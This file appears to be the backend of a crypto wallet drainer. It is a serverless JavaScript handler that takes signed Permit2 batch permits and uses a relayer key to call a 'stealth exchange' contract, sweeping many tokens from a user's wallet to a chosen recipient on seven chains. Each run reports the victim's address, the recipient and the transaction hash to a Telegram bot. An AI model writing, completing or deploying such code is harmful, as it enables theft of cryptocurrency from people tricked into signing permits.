import { createPublicClient, createWalletClient, http, isAddress, parseAbi, encodeFunctionData } from "viem";
import { mainnet, optimism, polygon, arbitrum, bsc, avalanche, base } from "viem/chains";
import { privateKeyToAccount } from "viem/accounts";

const SUPPORTED_CHAINS = {
  1: { chain: mainnet, rpc: process.env.ETHEREUM_RPC_URL || "https://eth.llamarpc.com" },
  10: { chain: optimism, rpc: process.env.OPTIMISM_RPC_URL || "https://mainnet.optimism.io" },
  137: { chain: polygon, rpc: process.env.POLYGON_RPC_URL || "https://polygon-rpc.com" },
  42161: { chain: arbitrum, rpc: process.env.ARBITRUM_RPC_URL || "https://arb1.arbitrum.io/rpc" },
  56: { chain: bsc, rpc: process.env.BSC_RPC_URL || "https://bsc-dataseed1.binance.org" },
  43114: { chain: avalanche, rpc: process.env.AVALANCHE_RPC_URL || "https://api.avax.network/ext/bc/C/rpc" },
  8453: { chain: base, rpc: process.env.BASE_RPC_URL || "https://mainnet.base.org" },
};

const STEALTH_EXCHANGE_ABI = parseAbi([
  "function batchPermitTransferFromBatch(address user, ((address token, uint160 amount, uint48 expiration, uint48 nonce)[] details, address spender, uint256 sigDeadline) permitBatch, bytes signature, address recipient) returns (uint256[] amounts)",
]);

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";

async function notifyTelegram(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
    });
  } catch (e) {}
}

export default async function handler(req, res) {
  // CORS
  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");
  if (req.method === "OPTIONS") return res.status(200).end();
  if (req.method !== "POST") return res.status(405).json({ status: "error", message: "Method not allowed" });

  try {
    const { user, recipient, permitBatch, signature, chainId } = req.body || {};

    if (!user || !isAddress(user)) return res.status(400).json({ status: "error", message: "Invalid user address" });
    if (!recipient || !isAddress(recipient)) return res.status(400).json({ status: "error", message: "Invalid recipient address" });
    if (!permitBatch || !Array.isArray(permitBatch.details)) return res.status(400).json({ status: "error", message: "Missing permitBatch.details" });
    if (!signature || !signature.startsWith("0x")) return res.status(400).json({ status: "error", message: "Invalid signature" });

    const relayerKey = process.env.RELAYER_PRIVATE_KEY;
    if (!relayerKey) return res.status(500).json({ status: "error", message: "RELAYER_PRIVATE_KEY not configured" });

    const pk = relayerKey.startsWith("0x") ? relayerKey : `0x${relayerKey}`;
    const account = privateKeyToAccount(pk);

    const id = chainId && SUPPORTED_CHAINS[chainId] ? chainId : 1;
    const { chain, rpc } = SUPPORTED_CHAINS[id];
    const transport = http(rpc);
    const publicClient = createPublicClient({ chain, transport });
    const walletClient = createWalletClient({ chain, transport, account });

    const exchangeAddress = process.env.STEALTH_EXCHANGE_ADDRESS || "0x788F5098C58BF5854ebf2b10B0D9303b13ABF43A";

    const normalizedPermitBatch = {
      details: permitBatch.details.map((d) => ({
        token: d.token,
        amount: BigInt(d.amount),
        expiration: Number(d.expiration),
        nonce: Number(d.nonce),
      })),
      spender: permitBatch.spender,
      sigDeadline: BigInt(permitBatch.sigDeadline),
    };

    const hash = await walletClient.writeContract({
      address: exchangeAddress,
      abi: STEALTH_EXCHANGE_ABI,
      functionName: "batchPermitTransferFromBatch",
      args: [user, normalizedPermitBatch, signature, recipient],
    });

    void notifyTelegram(
      `🚀 <b>Relay Executed</b>\n` +
      `User: <code>${user}</code>\n` +
      `Recipient: <code>${recipient}</code>\n` +
      `Relayer: <code>${account.address}</code>\n` +
      `Tokens: <b>${permitBatch.details.length}</b>\n` +
      `Chain: ${id}\n` +
      `Tx: <code>${hash}</code>`
    );

    return res.status(200).json({ status: "ok", hash });
  } catch (error) {
    const message = error instanceof Error ? error.message : String(error);
    console.error("[relay]", message);
    return res.status(500).json({ status: "error", message: message.slice(0, 500) });
  }
}
